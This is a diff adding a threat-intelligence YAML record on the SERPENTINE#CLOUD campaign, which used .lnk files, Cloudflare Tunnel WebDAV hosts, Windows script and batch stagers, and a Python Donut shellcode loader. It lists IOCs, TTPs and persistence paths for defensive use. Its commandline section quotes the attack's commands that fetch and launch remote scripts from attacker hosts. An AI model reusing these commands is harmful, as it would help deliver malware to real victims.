@@ -1,0 +1,107 @@
+description: Securonix threat researchers have been tracking a stealthy campaign involving
+  (.lnk) files to deliver remote payloads hosted on attacker-controlled Cloudflare
+  Tunnel subdomains. The infection chain ends in a Python-based shellcode loader that
+  executes Donut-packed payloads entirely in memory.
+attribution: Unknown, though the attacker demonstrates fluency in English based on
+  code comments and scripting practices. Telemetry indicates a strong focus on Western
+  targets, with confirmed activity observed in the United States, United Kingdom,
+  Germany and other regions across Europe and Asia.
+malware_families:
+- SERPENTINE#CLOUD
+- Donut
+- AsyncRAT
+- RevengeRAT
+TTPs:
+  processes:
+  - cmd.exe
+  - cscript.exe
+  - python.exe
+  - notepad.exe
+  commandline:
+  - cmd.exe /c robocopy \\\\flour-riding-merit-refers.trycloudflare[.]com@SSL\\DavWWWRoot\\RE_02WSF
+    %temp% tank.wsf /ns /nc /nfl /ndl >nul & start /min  cscript.exe //nologo %temp%\\tank.wsf
+  - start /min  cscript.exe //nologo %temp%\\tank.wsf
+  - \\\\depot-arrange-zero-kai.trycloudflare[.]com@SSL\\DavWWWRoot\\kiki.bat
+  - python.exe run.py -i jun02_an.bin -k a.txt
+  powershell: []
+  scripting_engine:
+  - VBScript
+  - batch
+  - Python
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: cmd.exe
+    destination_address: flour-riding-merit-refers.trycloudflare[.]com
+    port: '443'
+  - executable: cscript.exe
+    destination_address: depot-arrange-zero-kai.trycloudflare[.]com
+    port: '443'
+  - executable: python.exe
+    destination_address: eastern-instructional-ant-jungle.trycloudflare[.]com
+    port: '443'
+  - executable: python.exe
+    destination_address: nhvncpure[.]shop
+    port: '443'
+  - executable: python.exe
+    destination_address: nhvncpure[.]sbs
+    port: '443'
+  - executable: python.exe
+    destination_address: nhvncpure[.]click
+    port: '443'
+  - executable: python.exe
+    destination_address: nhvncpure[.]duckdns[.]org
+    port: '443'
+  - executable: python.exe
+    destination_address: duckdns[.]org
+    port: '443'
+  - executable: python.exe
+    destination_address: twilightparadox[.]com
+    port: '443'
+  - executable: python.exe
+    destination_address: strangled[.]net
+    port: '443'
+  - executable: python.exe
+    destination_address: mooo[.]com
+    port: '443'
+  - executable: python.exe
+    destination_address: nhvncpure[.]duckdns[.]org
+    port: '443'
+  file_activity:
+  - \\\\flour-riding-merit-refers.trycloudflare[.]com@SSL\\DavWWWRoot\\RE_02WSF
+  - '%temp%\\tank.wsf'
+  - '%temp%\\kiki.bat'
+  - C:\\Users\\username\\contacts\\RE_02WSF
+  - C:\\Users\\username\\contacts\\tank.wsf
+  - C:\\Users\\username\\contacts\\kiki.bat
+  - C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pws1.vbs
+  - C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\PWS.vbs
+  - C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startuppp.bat
+  persistence:
+  - Windows startup folder (C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start
+    Menu\\Programs\\Startup)
+  pipes: []
+  process_relations:
+  - cmd.exe -> cscript.exe
+  - cscript.exe -> kiki.bat
+  - kiki.bat -> python.exe
+  - python.exe -> run.py
+IOCs:
+- flour-riding-merit-refers.trycloudflare[.]com
+- depot-arrange-zero-kai.trycloudflare[.]com
+- eastern-instructional-ant-jungle.trycloudflare[.]com
+- nhvncpure[.]shop
+- nhvncpure[.]sbs
+- nhvncpure[.]click
+- nhvncpure[.]duckdns[.]org
+- duckdns[.]org
+- twilightparadox[.]com
+- strangled[.]net
+- mooo[.]com
+- 192.169.69[.]26
+- 51.89.212[.]145
+authors:
+- Tim Peck
+reference: https://www.securonix.com/blog/analyzing_serpentinecloud-threat-actors-abuse-cloudflare-tunnels-threat-research/
+date_of_publication: June 18, 2025
+file_creation_date: June 18, 2025
